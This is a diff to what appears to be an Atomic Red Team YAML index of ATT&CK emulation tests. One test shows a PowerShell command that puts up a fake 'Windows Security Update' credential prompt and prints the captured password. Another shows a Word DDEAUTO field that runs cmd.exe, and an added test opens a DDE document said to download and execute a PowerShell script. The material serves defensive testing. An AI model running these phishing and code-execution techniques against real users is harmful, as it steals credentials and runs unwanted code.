@@ -18542,11 +18542,14 @@ credential-access:
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
-        command: powershell.exe -command {$cred = $host.UI.PromptForCredential('Windows
-          Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);
-          echo $cred.GetNetworkCredential().Password;}
+        command: "# Creates GUI to prompt for password. Expect long pause before prompt
+          is available.    \n$cred = $host.UI.PromptForCredential('Windows Security
+          Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using
+          write-warning to allow message to show on console as echo and other similar
+          commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning
+          $cred.GetNetworkCredential().Password"
   T1142:
     technique:
       x_mitre_data_sources:
@@ -19520,6 +19523,20 @@ execution:
           The Field Code should now be displayed, change it to Contain the following:
 
           {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
+    - name: Execute PowerShell script via Word DDE
+      description: 'When the word document opens it will prompt the user to click
+        ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download
+        and execute a powershell script
+
+'
+      supported_platforms:
+      - windows
+      executor:
+        name: command_prompt
+        elevation_required: false
+        command: 'start $PathToAtomicsFolder\T1173\bin\DDE_Document.docx
+
+'
   T1118:
     technique:
       x_mitre_data_sources:
